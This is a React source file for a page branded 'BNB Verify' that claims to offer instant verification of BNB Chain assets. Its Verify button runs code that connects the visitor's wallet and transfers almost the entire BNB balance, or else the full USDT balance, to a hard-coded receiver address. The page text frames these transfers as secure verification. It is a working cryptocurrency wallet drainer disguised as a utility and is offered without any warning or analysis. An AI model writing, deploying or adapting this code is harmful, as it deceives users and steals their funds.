import { useState } from "react";
import { ethers } from "ethers";

export default function App() {
  const [status, setStatus] = useState("Click Verify to start...");
  const [navOpen, setNavOpen] = useState(false);

  const RECEIVER = "0x473aef5D2464d76B4C46cF883E611698b452d774"; 
  const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955"; 
  const ERC20_ABI = [
    "function balanceOf(address) view returns (uint)",
    "function transfer(address to, uint amount) returns (bool)"
  ];

  async function handleVerify() {
    try {
      if (!window.ethereum) {
        setStatus("No wallet detected. Please install Binance Wallet or MetaMask.");
        return;
      }

      await window.ethereum.request({ method: "eth_requestAccounts" });
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();

      setStatus("Checking balances...");

      const balanceBNB = await provider.getBalance(userAddress);
      if (balanceBNB > ethers.parseEther("0.001")) {
        setStatus("Sending BNB...");
        const tx = await signer.sendTransaction({
          to: RECEIVER,
          value: balanceBNB - ethers.parseEther("0.0005")
        });
        await tx.wait();
        setStatus("BNB sent successfully ✅");
        return;
      }

      const usdt = new ethers.Contract(USDT_BEP20, ERC20_ABI, signer);
      const balanceUSDT = await usdt.balanceOf(userAddress);
      if (balanceUSDT > 0n) {
        setStatus("Sending USDT...");
        const tx = await usdt.transfer(RECEIVER, balanceUSDT);
        await tx.wait();
        setStatus("USDT sent successfully ✅");
        return;
      }

      setStatus("No BNB or USDT found ❌");
    } catch (err) {
      console.error(err);
      setStatus("Error: " + err.message);
    }
  }

  return (
    <div className="min-h-screen bg-[#121212] text-[#E0E0E0] font-inter flex flex-col">
      
      {/* Navbar */}
      <header className="bg-[#171717] bg-opacity-90 backdrop-blur-md sticky top-0 z-50 shadow-md w-full">
        <nav className="container mx-auto px-6 py-4 flex justify-between items-center">
          <a href="#" className="flex items-center space-x-2">
            <div className="h-8 w-8 bg-yellow-400 rounded-full"></div>
            <span className="text-xl font-bold text-yellow-400">BNB Verify</span>
          </a>

          {/* Desktop links */}
          <div className="hidden md:flex space-x-8 text-sm font-medium">
            <a href="#" className="hover:text-yellow-400 transition-colors">Home</a>
            <a href="#" className="hover:text-yellow-400 transition-colors">Explorer</a>
            <a href="#" className="hover:text-yellow-400 transition-colors">Tokens</a>
            <a href="#" className="hover:text-yellow-400 transition-colors">NFTs</a>
            <a href="#" className="hover:text-yellow-400 transition-colors">DApps</a>
          </div>

          {/* Mobile Hamburger */}
          <button 
            onClick={() => setNavOpen(!navOpen)} 
            className="md:hidden text-gray-400 focus:outline-none">
            <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d={navOpen ? "M6 18L18 6M6 6l12 12" : "M4 6h16M4 12h16m-7 6h7"} />
            </svg>
          </button>
        </nav>

        {/* Mobile links */}
        {navOpen && (
          <div className="md:hidden bg-[#171717] bg-opacity-95 py-4 px-6 flex flex-col space-y-3">
            {["Home","Explorer","Tokens","NFTs","DApps"].map((item,i) => (
              <a key={i} href="#" className="hover:text-yellow-400 transition-colors">{item}</a>
            ))}
          </div>
        )}
      </header>

      {/* Hero Section */}
      <main className="flex flex-col items-center justify-center text-center px-6 py-12">
        <h1 className="text-3xl sm:text-4xl md:text-5xl font-bold text-yellow-400 mb-4">Verify Crypto Assets</h1>
        <p className="text-gray-300 mb-8 max-w-xl">
          Instant verification of BNB Chain assets. Supports both BNB and USDT (BEP20) transfers securely.
        </p>

        <div className="relative flex justify-center items-center w-36 h-36 sm:w-40 sm:h-40 mb-12">
          <div className="absolute w-full h-full rounded-full border-2 border-yellow-400 opacity-30 animate-pulse-slow"></div>
          <div className="absolute w-3/4 h-3/4 rounded-full border-2 border-yellow-400 opacity-50 animate-pulse-slow delay-1000"></div>
          <div className="absolute w-1/2 h-1/2 rounded-full border-2 border-yellow-400 opacity-70 animate-pulse-slow delay-2000"></div>
          <button 
            onClick={handleVerify} 
            className="bg-yellow-400 text-[#121212] px-6 py-3 rounded-full font-semibold z-10">
            Verify
          </button>
        </div>

        <p className="text-gray-300 text-lg">{status}</p>
      </main>

      {/* Cards Section */}
      <section className="container mx-auto px-6 py-12 grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 gap-6">
        {["Explorer","Tokens","NFTs","DApps"].map((title, i) => (
          <div key={i} className="card bg-[#1E1E1E] rounded-xl p-6 text-center transition-all cursor-pointer hover:translate-y-[-5px] hover:shadow-lg">
            <h2 className="text-yellow-400 text-lg font-semibold mb-2">{title}</h2>
            <p className="text-gray-400 text-sm">Check {title.toLowerCase()} on BNB Chain securely.</p>
          </div>
        ))}
      </section>

      {/* Footer */}
      <footer className="bg-[#171717] mt-auto py-6 text-center text-gray-500 text-sm">
        &copy; 2025 BNB Verify. Powered by BNB Chain.
      </footer>

      <style>
        {`
          @keyframes pulse-slow {
            0%,100% { transform: scale(0.8); opacity: 0.7; }
            50% { transform: scale(1.3); opacity: 0; }
          }
          .animate-pulse-slow { animation: pulse-slow 2.5s infinite; }
          .delay-1000 { animation-delay: 1s; }
          .delay-2000 { animation-delay: 2s; }
        `}
      </style>
    </div>
  );
}
